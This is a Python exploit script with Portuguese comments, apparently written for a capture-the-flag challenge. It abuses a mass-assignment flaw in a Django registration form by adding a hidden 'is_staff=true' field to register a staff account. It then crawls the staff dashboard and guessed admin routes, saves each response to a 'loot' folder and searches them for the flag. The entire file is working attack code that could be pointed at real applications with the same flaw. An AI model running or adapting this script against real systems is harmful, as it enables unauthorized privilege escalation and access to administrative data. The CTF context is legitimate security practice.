#!/usr/bin/env python3
import os
import re
import html
import time
import requests
from urllib.parse import urljoin
from urllib3.exceptions import InsecureRequestWarning

# Desativa warning visual de TLS no ambiente CTF.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

TARGET = os.environ.get("TARGET", "https://6cdfd5b0113a794f.chal.ctf.ae").rstrip("/")
BASE = TARGET + "/"

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/125 Safari/537.36"

FLAG_RE = re.compile(r"flag\{[^}\r\n]+\}", re.IGNORECASE)

os.makedirs("loot", exist_ok=True)


def extract_csrf(body):
    """
    Extrai o token CSRF do input hidden do Django.
    """
    match = re.search(
        r'name=["\']csrfmiddlewaretoken["\']\s+value=["\']([^"\']+)["\']',
        body,
        re.IGNORECASE,
    )
    return match.group(1) if match else None


def strip_tags(body):
    """
    Remove HTML/CSS/JS para gerar snippets legíveis no terminal.
    """
    body = re.sub(r"<script\b.*?</script>", " ", body, flags=re.I | re.S)
    body = re.sub(r"<style\b.*?</style>", " ", body, flags=re.I | re.S)
    body = re.sub(r"<[^>]+>", " ", body)
    body = html.unescape(body)
    return re.sub(r"\s+", " ", body).strip()


def save(name, response):
    """
    Salva resposta bruta para análise e writeup.
    """
    safe = re.sub(r"[^a-zA-Z0-9_.-]+", "_", name)
    path = f"loot/script3_{safe}.txt"

    with open(path, "w", encoding="utf-8", errors="ignore") as f:
        f.write(f"URL: {response.url}\n")
        f.write(f"STATUS: {response.status_code}\n")
        f.write("HEADERS:\n")
        for k, v in response.headers.items():
            f.write(f"{k}: {v}\n")
        f.write("\nBODY:\n")
        f.write(response.text)

    return path


def check_flag(label, response):
    """
    Procura flag na resposta.
    """
    match = FLAG_RE.search(response.text)
    if match:
        flag = match.group(0)

        print()
        print("=" * 80)
        print("[+] FLAG ENCONTRADA")
        print("=" * 80)
        print(flag)

        with open("flag.txt", "w", encoding="utf-8") as f:
            f.write(flag + "\n")

        print("[+] Flag salva em flag.txt")
        save(label, response)
        return True

    return False


def create_staff_session():
    """
    Explora o mass assignment no cadastro com is_staff=true.
    """
    session = requests.Session()
    session.headers.update({"User-Agent": UA})

    print("[*] Abrindo /register/ para pegar CSRF")
    register_page = session.get(urljoin(BASE, "register/"), timeout=15, verify=False)
    save("register_page", register_page)

    csrf = extract_csrf(register_page.text)
    if not csrf:
        raise RuntimeError("Não consegui extrair csrfmiddlewaretoken")

    suffix = str(int(time.time()))
    username = f"guerreiro_staff_{suffix}"
    email_addr = f"{username}@computaria.com"
    password = "Guerreiro@12345"

    data = {
        "csrfmiddlewaretoken": csrf,
        "username": username,
        "email": email_addr,
        "password": password,
        "password_confirm": password,

        # Campo vulnerável: não aparece no formulário, mas o backend aceita.
        "is_staff": "true",
    }

    headers = {
        "Referer": urljoin(BASE, "register/"),
        "X-CSRFToken": csrf,
    }

    print("[*] Criando usuário staff via overposting")
    response = session.post(
        urljoin(BASE, "register/"),
        data=data,
        headers=headers,
        timeout=15,
        allow_redirects=True,
        verify=False,
    )

    path = save("staff_register_response", response)

    print("[*] Usuário:", username)
    print("[*] Email:", email_addr)
    print("[*] Senha:", password)
    print("[*] Status:", response.status_code)
    print("[*] URL final:", response.url)
    print("[*] Resposta salva em:", path)

    text = strip_tags(response.text)
    print("[*] Snippet dashboard:", text[:500])

    check_flag("staff_register_response", response)

    return session, response.text


def extract_links(body):
    """
    Extrai links href do dashboard staff.
    O objetivo é descobrir o href real do botão Admin Dashboard.
    """
    links = set()

    for href in re.findall(r'href=["\']([^"\']+)["\']', body, flags=re.I):
        href = html.unescape(href).strip()

        # Ignora links vazios, âncoras e recursos externos.
        if not href or href == "#" or href.startswith("data:") or href.startswith("http"):
            continue

        links.add(urljoin(BASE, href.lstrip("/")))

    return sorted(links)


def main():
    print("[*] Target:", TARGET)

    session, dashboard_body = create_staff_session()

    print()
    print("=" * 80)
    print("[*] Links encontrados no dashboard staff")
    print("=" * 80)

    links = extract_links(dashboard_body)

    for link in links:
        print(link)

    # Candidatos extras baseados no texto "Admin Dashboard".
    # Mesmo que o link não seja capturado por regex, testamos padrões prováveis.
    extra_candidates = [
        "/admin-dashboard/",
        "/admin_dashboard/",
        "/dashboard/admin/",
        "/dashboard/admin",
        "/admin/dashboard/",
        "/admin/dashboard",
        "/administration/",
        "/administration/dashboard/",
    ]

    for route in extra_candidates:
        links.append(urljoin(BASE, route.lstrip("/")))

    # Remove duplicados preservando ordem.
    seen = set()
    unique_links = []
    for link in links:
        if link not in seen:
            seen.add(link)
            unique_links.append(link)

    print()
    print("=" * 80)
    print("[*] Acessando links/candidatos com sessão Staff")
    print("=" * 80)

    for link in unique_links:
        response = session.get(
            link,
            timeout=15,
            allow_redirects=True,
            verify=False,
        )

        path = save("visit_" + link.replace(TARGET, "").strip("/").replace("/", "_") or "root", response)
        text = strip_tags(response.text)

        print()
        print(f"[*] GET {link}")
        print("[*] Status:", response.status_code)
        print("[*] URL final:", response.url)
        print("[*] Arquivo:", path)
        print("[*] Snippet:", text[:650])

        if check_flag("visit_" + link, response):
            return

    print()
    print("=" * 80)
    print("[-] Flag não encontrada automaticamente")
    print("=" * 80)
    print("[*] Revisão manual sugerida:")
    print("grep -RniE 'flag\\{|Admin Dashboard|confidential|credential|key-panel|flag-value|Staff|Administration' loot/script3_*.txt")


if __name__ == "__main__":
    main()
